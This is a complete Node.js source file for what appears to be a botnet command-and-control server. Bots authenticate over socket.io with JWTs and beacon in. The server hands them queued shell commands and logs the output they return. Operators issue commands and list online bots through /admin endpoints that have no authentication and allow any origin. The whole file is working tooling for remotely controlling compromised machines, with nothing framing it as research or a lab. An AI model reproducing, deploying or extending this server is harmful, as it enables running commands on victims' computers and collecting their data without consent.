require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const jwt = require('jsonwebtoken');
const { Server } = require('socket.io');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  path: '/ws',
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  }
});

const PORT = process.env.PORT || 3000;
const SECRET = process.env.JWT_SECRET;

if (!SECRET) {
  console.error("JWT_SECRET missing in .env");
  process.exit(1);
}

console.log(`Started on port ${PORT}`);

// middleware
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(helmet());

// data stores
const commandQueue = new Map();
const lastResults = new Map();
const connectedBots = new Map();

// socket authentication
io.use((socket, next) => {
  const token = socket.handshake.auth?.token;
  const botId = socket.handshake.auth?.botId;

  if (!token || !botId) return next(new Error("Auth failed"));

  try {
    const decoded = jwt.verify(token, SECRET);
    if (decoded.botId !== botId) return next(new Error("Invalid bot"));
    socket.botId = botId;
    next();
  } catch (err) {
    console.error("JWT Error:", err.message);
    next(new Error("Token invalid"));
  }
});

io.on('connection', (socket) => {
  const botId = socket.botId;
  console.log(`Bot connected: ${botId.substring(0,12)}...`);

  connectedBots.set(botId, {
    connectedAt: Date.now(),
    lastSeen: Date.now()
  });

  sendPendingCommands(socket);

  socket.on('beacon', () => {
    if (connectedBots.has(botId)) {
      connectedBots.get(botId).lastSeen = Date.now();
    }
    sendPendingCommands(socket);
  });

  socket.on('result', (data) => {
    console.log(`Result from ${botId.substring(0,12)}...`);
    console.log(`Command: ${data.command}`);
    console.log(`Output: ${data.output ? data.output.substring(0, 250) : 'no output'}...\n`);
    lastResults.set(botId, data);
  });

  socket.on('disconnect', () => {
    console.log(`Bot disconnected: ${botId.substring(0,12)}...`);
    connectedBots.delete(botId);
  });
});

function sendPendingCommands(socket) {
  const cmds = commandQueue.get(socket.botId) || [];
  if (cmds.length > 0) {
    socket.emit('commands', cmds);
    commandQueue.set(socket.botId, []);
    console.log(`Sent ${cmds.length} command(s) to ${socket.botId.substring(0,12)}...`);
  }
}

// send command
app.post('/admin/issue', (req, res) => {
  const { botId, command } = req.body;
  if (!botId || !command) {
    return res.status(400).json({ status: "error", message: "botId and command required" });
  }

  if (!commandQueue.has(botId)) commandQueue.set(botId, []);
  commandQueue.get(botId).push(command.trim());

  console.log(`Command queued for ${botId.substring(0,12)}...: ${command}`);
  res.json({ status: "queued" });
});

// get last command result
app.get('/admin/result/:botId', (req, res) => {
  const result = lastResults.get(req.params.botId);
  if (!result) {
    return res.json({ status: "no_result", message: "No result yet" });
  }
  res.json({ status: "success", ...result });
});

// get online bots
app.get('/admin/bots', (req, res) => {
  const bots = Array.from(connectedBots.entries()).map(([botId, info]) => ({
    botId: botId,
    shortId: botId.substring(0, 12) + "...",
    connectedAt: new Date(info.connectedAt).toLocaleTimeString(),
    lastSeen: Math.floor((Date.now() - info.lastSeen) / 1000) + "s ago"
  }));

  res.json({ total: bots.length, bots: bots });
});

server.listen(PORT, () => {
  console.log(`Listening on http://127.0.0.1:${PORT}`);
});